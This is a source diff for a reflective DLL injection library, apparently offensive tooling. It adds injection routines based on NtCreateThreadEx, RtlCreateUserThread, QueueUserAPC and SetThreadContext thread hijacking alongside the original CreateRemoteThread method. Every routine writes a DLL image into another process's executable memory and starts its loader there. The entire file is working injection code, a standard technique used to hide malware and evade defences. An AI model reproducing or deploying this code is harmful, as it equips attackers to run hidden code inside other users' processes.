@@ -4,7 +4,7 @@
 
 #include "reflective_injection.h"
 
-BOOL InjectToProcess(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
+BOOL InjectToProcess_CreateRemoteThread(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
 {
 	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
 	if (!hProcess)
@@ -15,12 +15,13 @@ BOOL InjectToProcess(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
 		return FALSE;
 	}
 
-	HANDLE hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
+	HANDLE hModule = LoadRemoteLibraryR_CreateRemoteThread(hProcess, lpBuffer, dwLength, NULL);
 	if (!hModule)
 	{
 #ifdef DEBUG
 		printf("[-] Failed to inject the DLL\n");
 #endif
+		return FALSE;
 	}
 
 #ifdef DEBUG
@@ -33,6 +34,127 @@ BOOL InjectToProcess(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
 
 	return TRUE;
 }
+
+BOOL InjectToProcess_NtCreateThreadEx(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	if (!hProcess)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
+#endif
+		return FALSE;
+	}
+
+	HANDLE hModule = LoadRemoteLibraryR_NtCreateThreadEx(hProcess, lpBuffer, dwLength, NULL);
+	if (!hModule)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to inject the DLL\n");
+#endif
+		return FALSE;
+	}
+
+#ifdef DEBUG
+	printf("[+] Injected the DLL into process %d\n", dwProcessId);
+#endif
+
+	WaitForSingleObject(hModule, -1);
+
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
+BOOL InjectToProcess_pfnRtlCreateUserThread(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	if (!hProcess)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
+#endif
+		return FALSE;
+	}
+
+	HANDLE hModule = LoadRemoteLibraryR_pfnRtlCreateUserThread(hProcess, lpBuffer, dwLength, NULL);
+	if (!hModule)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to inject the DLL\n");
+#endif
+		return FALSE;
+	}
+
+#ifdef DEBUG
+	printf("[+] Injected the DLL into process %d\n", dwProcessId);
+#endif
+
+	WaitForSingleObject(hModule, -1);
+
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
+BOOL InjectToProcess_QueueUserAPC(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	if (!hProcess)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
+#endif
+		return FALSE;
+	}
+
+	DWORD result = LoadRemoteLibraryR_QueueUserAPC(dwProcessId, hProcess, lpBuffer, dwLength, NULL);
+	if (result == 0)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to inject the DLL\n");
+#endif
+		return FALSE;
+	}
+
+#ifdef DEBUG
+	printf("[+] Injected the DLL into process %d\n", dwProcessId);
+#endif
+
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
+BOOL InjectToProcess_SetThreadContext(DWORD dwProcessId, LPVOID lpBuffer, DWORD dwLength)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	if (!hProcess)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to open process with pid: %d\n", dwProcessId);
+#endif
+		return FALSE;
+	}
+
+	DWORD result = LoadRemoteLibraryR_SetThreadContext(dwProcessId, hProcess, lpBuffer, dwLength, NULL);
+	if (result == 0)
+	{
+#ifdef DEBUG
+		printf("[-] Failed to inject the DLL\n");
+#endif
+		return FALSE;
+	}
+
+#ifdef DEBUG
+	printf("[+] Injected the DLL into process %d\n", dwProcessId);
+#endif
+
+	CloseHandle(hProcess);
+
+	return TRUE;
+}
+
 
 DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
 {
@@ -191,7 +313,7 @@ HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)
 // Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
 // Note: This function currently cant inject accross architectures, but only to architectures which are the 
 //       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
-HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+HANDLE WINAPI LoadRemoteLibraryR_CreateRemoteThread(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
 {
 	BOOL bSuccess = FALSE;
 	LPVOID lpRemoteLibraryBuffer = NULL;
@@ -200,41 +322,335 @@ HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLengt
 	DWORD dwReflectiveLoaderOffset = 0;
 	DWORD dwThreadId = 0;
 
-	__try
-	{
-		do
-		{
-			if (!hProcess || !lpBuffer || !dwLength)
-				break;
+	if (!hProcess || !lpBuffer || !dwLength)
+		return NULL;
 
-			// check if the library has a ReflectiveLoader...
-			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
-			if (!dwReflectiveLoaderOffset)
-				break;
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+	if (!dwReflectiveLoaderOffset)
+		return NULL;
 
-			// alloc memory (RWX) in the host process for the image...
-			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-			if (!lpRemoteLibraryBuffer)
-				break;
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpRemoteLibraryBuffer)
+		return NULL;
 
-			// write the image into the host process...
-			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
-				break;
+	// write the image into the host process...
+	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		return NULL;
 
-			// add the offset to ReflectiveLoader() to the remote library address...
-			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
 
-			// create a remote thread in the host process to call the ReflectiveLoader!
-			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
+	// create a remote thread in the host process to call the ReflectiveLoader!
+	hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
 
-		} while (0);
-
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER)
-	{
-		hThread = NULL;
-	}
+	ResumeThread(hThread);
 
 	return hThread;
 }
 //===============================================================================================//
+
+// Using NtCreateThreadEx
+// Source : https://github.com/3gstudent/Inject-dll-by-APC
+
+typedef LONG NTSTATUS;
+typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
+(
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN PVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN PVOID lpStartAddress,
+	IN PVOID lpParameter,
+	IN ULONG Flags,
+	IN SIZE_T StackZeroBits,
+	IN SIZE_T SizeOfStackCommit,
+	IN SIZE_T SizeOfStackReserve,
+	OUT PVOID lpBytesBuffer);
+
+HANDLE WINAPI LoadRemoteLibraryR_NtCreateThreadEx(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+{
+	BOOL bSuccess = FALSE;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwThreadId = 0;
+
+	if (!hProcess || !lpBuffer || !dwLength)
+		return NULL;
+
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+	if (!dwReflectiveLoaderOffset)
+		return NULL;
+
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpRemoteLibraryBuffer)
+		return NULL;
+
+	// write the image into the host process...
+	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		return NULL;
+
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+	// Using NtCreateThreadEx
+	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
+	if (NtCreateThreadEx == NULL)
+	{
+		return NULL;
+	}
+
+	NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, lpReflectiveLoader, lpParameter, FALSE, NULL, NULL, NULL, NULL);
+
+	ResumeThread(hThread);
+
+	return hThread;
+}
+
+//===============================================================================================//
+
+// Using pfnRtlCreateUserThread
+// Source : https://github.com/3gstudent/Inject-dll-by-APC
+
+typedef struct _CLIENT_ID {
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef NTSTATUS(NTAPI* pfnRtlCreateUserThread)(
+	IN HANDLE ProcessHandle,
+	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+	IN BOOLEAN CreateSuspended,
+	IN ULONG StackZeroBits OPTIONAL,
+	IN SIZE_T StackReserve OPTIONAL,
+	IN SIZE_T StackCommit OPTIONAL,
+	IN PTHREAD_START_ROUTINE StartAddress,
+	IN PVOID Parameter OPTIONAL,
+	OUT PHANDLE ThreadHandle OPTIONAL,
+	OUT PCLIENT_ID ClientId OPTIONAL);
+
+HANDLE WINAPI LoadRemoteLibraryR_pfnRtlCreateUserThread(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+{
+	BOOL bSuccess = FALSE;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwThreadId = 0;
+
+	if (!hProcess || !lpBuffer || !dwLength)
+		return NULL;
+
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+	if (!dwReflectiveLoaderOffset)
+		return NULL;
+
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpRemoteLibraryBuffer)
+		return NULL;
+
+	// write the image into the host process...
+	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		return NULL;
+
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+	// Using NtCreateThreadEx
+	pfnRtlCreateUserThread RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
+	if (RtlCreateUserThread == NULL)
+	{
+		return NULL;
+	}
+
+	RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpReflectiveLoader, lpParameter, &hThread, NULL);
+
+	ResumeThread(hThread);
+
+	return hThread;
+}
+
+//===============================================================================================//
+
+// Using QueueUserAPC
+// Source : https://github.com/MahmoudZohdy/Process-Injection-Techniques/blob/main/Process_Injection_Techniques/Process_Injection_Techniques/Injection.h
+
+DWORD WINAPI LoadRemoteLibraryR_QueueUserAPC(DWORD processId, HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+{
+	BOOL bSuccess = FALSE;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwThreadId = 0;
+
+	if (!hProcess || !lpBuffer || !dwLength)
+		return NULL;
+
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+	if (!dwReflectiveLoaderOffset)
+		return NULL;
+
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpRemoteLibraryBuffer)
+		return NULL;
+
+	// write the image into the host process...
+	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		return NULL;
+
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+	std::vector<DWORD> ThreadIds;
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+
+	if (Thread32First(snapshot, &threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == processId) {
+				ThreadIds.push_back(threadEntry.th32ThreadID);
+			}
+		} while (Thread32Next(snapshot, &threadEntry));
+	}
+	
+	bool success = false;
+	// Queue APC From all threads in the process
+	for (DWORD threadId : ThreadIds) {
+		hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
+		if (!hThread)
+			continue;
+
+		DWORD status = QueueUserAPC((PAPCFUNC)lpReflectiveLoader, hThread, (ULONG_PTR)lpParameter);
+		if (status)
+		{
+			success = true;
+		}
+
+		Sleep(2 * 1000);
+		CloseHandle(hThread);
+
+		if (success)
+			break;
+
+	}
+
+	if (success)
+		return 1;
+	else
+		return NULL;
+}
+
+//===============================================================================================//
+
+// Using SetThreadContext
+// Source : https://github.com/MahmoudZohdy/Process-Injection-Techniques/blob/main/Process_Injection_Techniques/Process_Injection_Techniques/Injection.h
+
+DWORD WINAPI LoadRemoteLibraryR_SetThreadContext(DWORD processId, HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+{
+	BOOL bSuccess = FALSE;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwThreadId = 0;
+
+	if (!hProcess || !lpBuffer || !dwLength)
+		return NULL;
+
+	// check if the library has a ReflectiveLoader...
+	dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+	if (!dwReflectiveLoaderOffset)
+		return NULL;
+
+	// alloc memory (RWX) in the host process for the image...
+	lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!lpRemoteLibraryBuffer)
+		return NULL;
+
+	// write the image into the host process...
+	if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		return NULL;
+
+	// add the offset to ReflectiveLoader() to the remote library address...
+	lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+	std::vector<DWORD> ThreadIds;
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+
+	CONTEXT ThreadContext;
+	memset(&ThreadContext, 0, sizeof(CONTEXT));
+	ThreadContext.ContextFlags = CONTEXT_ALL;
+
+	bool success = false;
+	if (Thread32First(snapshot, &threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == processId) {
+
+				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
+				if (!hThread) {
+					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
+					continue;
+				}
+
+				DWORD status = SuspendThread(hThread);
+				if (status == -1)
+				{
+					printf("Failed to suspend thread: %d\n", GetLastError());
+					CloseHandle(hThread);
+					continue;
+				}
+
+				if (GetThreadContext(hThread, &ThreadContext))
+				{
+					printf("getThreadContext\n");
+#if WIN_X64			
+					ThreadContext.Rip = (DWORD64)lpReflectiveLoader;
+#else
+					ThreadContext.Eip = (DWORD64)lpReflectiveLoader;
+#endif
+					if (!SetThreadContext(hThread, &ThreadContext)) {
+#ifdef DEBUG
+						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
+#endif
+						CloseHandle(hThread);
+						continue;
+					}
+					status = ResumeThread(hThread);
+					if (status == -1) {
+#ifdef DEBUG
+						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", processId, GetLastError());
+#endif
+						CloseHandle(hThread);
+						continue;
+					}
+					else
+					{
+						success = true;
+					}
+
+					printf("Done\n");
+
+					CloseHandle(hThread);
+					break;
+				}
+
+			}
+		} while (Thread32Next(snapshot, &threadEntry));
+	}
+
+	if (success)
+		return 1;
+	else
+		return NULL;
+}
